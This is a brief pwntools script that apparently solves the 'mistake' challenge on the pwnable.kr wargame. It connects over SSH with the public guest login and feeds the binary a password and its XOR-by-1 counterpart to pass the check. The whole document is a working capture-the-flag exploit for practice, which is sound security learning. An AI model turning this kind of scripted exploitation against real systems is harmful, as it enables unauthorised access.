from pwn import *
s = ssh('mistake', 'pwnable.kr', 2222, 'guest')

path = './mistake'
p = s.run(path)
first_input = b'1234567890'
second_input = b''

for c in first_input:
    second_input += bytes([c ^ 1])

p.recvuntil(b'do not bruteforce...\n')
p.send(first_input + b'\n' + second_input + b'\n')
p.interactive()